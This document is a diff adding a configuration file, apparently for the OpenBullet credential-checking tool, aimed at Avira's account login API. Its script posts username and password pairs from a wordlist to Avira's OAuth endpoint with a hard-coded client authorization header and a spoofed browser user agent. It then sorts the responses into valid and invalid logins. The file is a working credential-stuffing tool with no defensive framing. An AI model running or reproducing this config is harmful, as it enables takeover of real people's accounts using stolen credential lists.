@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "avira ",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-03T14:27:11.9279719+02:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy",
+  "Version": "1.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.my.avira.com/v2/oauth/" AutoRedirect=FALSE 
+  CONTENT "{\"grant_type\":\"password\",\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Authorization: Basic YXZpcmEvZGFzaGJvYXJkOjAyMjI4OWNjOTZhMTQwOTI4YWQ5ODNjNTJmYTRjYTNlMDZmODBkZDg5NjgwNGE0YmIxNDFkMDc2MjY2YTQ0OTA=" 
+  HEADER "Origin: https://my.avira.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid_credentials" 
+  KEYCHAIN Success OR 
+    KEY "device_token" 
+
